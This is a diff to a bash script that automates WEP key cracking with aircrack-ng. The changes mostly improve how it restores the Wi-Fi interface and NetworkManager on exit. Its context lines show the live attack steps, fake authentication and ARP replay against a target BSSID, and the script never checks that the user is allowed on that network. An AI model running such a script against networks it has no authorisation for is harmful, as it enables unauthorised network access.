@@ -19,8 +19,8 @@
 # Example:
 #   sudo ./wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
 #
-# Cleanup (stop monitor + restore NetworkManager) runs automatically on exit,
-# including Ctrl-C. If WiFi ever stays dark, run: sudo airmon-ng stop <if>mon ; sudo systemctl start NetworkManager
+# Cleanup (stop attacks, restore managed mode, restart NetworkManager) runs on exit,
+# including Ctrl-C. If WiFi still stays dark, see COMMANDS.md section 8.
 #
 set -u
 
@@ -36,6 +36,9 @@ MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
 RETRY_SECS=15            # how often to re-check the capture / re-run aircrack
 
 usage() { sed -n '2,30p' "$0"; exit 1; }
+
+# Type of an interface ("managed", "monitor", ...); empty if the interface doesn't exist.
+iface_type() { iw dev "$1" info 2>/dev/null | awk '$1=="type"{print $2}'; }
 
 while getopts ":i:b:c:e:m:o:t:h" opt; do
   case "$opt" in
@@ -53,7 +56,7 @@ done
 # ---- preflight ------------------------------------------------------------
 [[ $EUID -eq 0 ]] || { echo "[!] Run with sudo."; exit 1; }
 [[ -n "$IFACE" && -n "$BSSID" && -n "$CHANNEL" ]] || usage
-for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw; do
+for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli; do
   command -v "$t" >/dev/null || { echo "[!] Missing: $t (sudo dnf install aircrack-ng)"; exit 1; }
 done
 [[ "$MODE" == "active" || "$MODE" == "passive" ]] || { echo "[!] -m must be active|passive"; exit 1; }
@@ -68,14 +71,43 @@ OUT="${LOGDIR}/${PREFIX}"
 MON=""        # monitor interface name, discovered after airmon-ng start
 AIRODUMP_PID=""
 REPLAY_PID=""
+FAKEAUTH_PID=""
+AIRMON_LOG="${LOGDIR}/airmon.log"   # airmon-ng and NetworkManager output for this run
+: > "$AIRMON_LOG"
 
 cleanup() {
   echo; echo "[*] Cleaning up..."
-  [[ -n "$REPLAY_PID"   ]] && kill "$REPLAY_PID"   2>/dev/null
-  [[ -n "$AIRODUMP_PID" ]] && kill "$AIRODUMP_PID" 2>/dev/null
-  if [[ -n "$MON" ]]; then airmon-ng stop "$MON" >/dev/null 2>&1; fi
-  systemctl start NetworkManager 2>/dev/null
-  echo "[*] Monitor stopped, NetworkManager restarted. WiFi should be back."
+  for pid in "$FAKEAUTH_PID" "$REPLAY_PID" "$AIRODUMP_PID"; do
+    [[ -n "$pid" ]] && kill "$pid" 2>/dev/null
+  done
+  # A separate <iface>mon vif is removed by airmon-ng stop.
+  if [[ -n "$MON" && "$MON" != "$IFACE" ]]; then airmon-ng stop "$MON" >>"$AIRMON_LOG" 2>&1; fi
+  # Single-vif drivers (e.g. rtl8723be) keep the managed name in monitor mode, and airmon-ng
+  # stop can't switch it back while the link is up. Take the link down first.
+  if [[ "$(iface_type "$IFACE")" == monitor ]]; then
+    ip link set "$IFACE" down
+    iw dev "$IFACE" set type managed 2>>"$AIRMON_LOG"
+    ip link set "$IFACE" up
+  fi
+  # NetworkManager only adopts a Wi-Fi device that is in managed mode when it starts.
+  systemctl restart NetworkManager 2>/dev/null
+  local now
+  now=$(iface_type "$IFACE")
+  if [[ "$now" == managed ]]; then
+    echo "[*] $IFACE is in managed mode and NetworkManager restarted."
+    for _ in 1 2 3 4 5; do
+      nmcli -t -f DEVICE device 2>/dev/null | grep -qx "$IFACE" && break
+      sleep 2
+    done
+    if nmcli -t -f DEVICE device 2>/dev/null | grep -qx "$IFACE"; then
+      echo "[*] NetworkManager sees $IFACE. WiFi should reconnect."
+    else
+      echo "[!] NetworkManager does not list $IFACE. Check: nmcli device status" >&2
+    fi
+  else
+    echo "[!] $IFACE is in '${now:-missing}' mode, so WiFi will stay down." >&2
+    echo "    Restore it by hand: see COMMANDS.md section 8." >&2
+  fi
 }
 # cleanup runs exactly once, on the way out. Ctrl-C (INT) / TERM don't run
 # cleanup directly — they turn into a real exit, which fires the EXIT trap.
@@ -86,14 +118,14 @@ trap 'exit 130' INT TERM
 
 # ---- start monitor --------------------------------------------------------
 echo "[*] Freeing the radio (stopping NetworkManager/wpa_supplicant)..."
-airmon-ng check kill >/dev/null 2>&1
+airmon-ng check kill >>"$AIRMON_LOG" 2>&1
 
 echo "[*] Enabling monitor mode on $IFACE..."
-airmon-ng start "$IFACE" >/dev/null 2>&1
+airmon-ng start "$IFACE" >>"$AIRMON_LOG" 2>&1
 
 # airmon-ng may name it <iface>mon, or rename to e.g. mon0 — discover it.
 MON=$(iw dev | awk '/Interface/{n=$2} /type monitor/{print n; exit}')
-[[ -z "$MON" ]] && MON="${IFACE}mon"
+[[ -n "$MON" ]] || { echo "[!] No monitor interface after airmon-ng start, see $AIRMON_LOG"; exit 1; }
 echo "[*] Monitor interface: $MON"
 
 echo "[*] Locking to channel $CHANNEL..."
@@ -124,6 +156,7 @@ if [[ "$MODE" == "active" ]]; then
   # keep re-authenticating every 10s so we stay associated
   aireplay-ng --fakeauth 10 -o 1 -q 10 -a "$BSSID" -h "$MYMAC" \
     ${ESSID:+-e "$ESSID"} "$MON" >/dev/null 2>&1 &
+  FAKEAUTH_PID=$!
 
   echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
   aireplay-ng --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" >/dev/null 2>&1 &
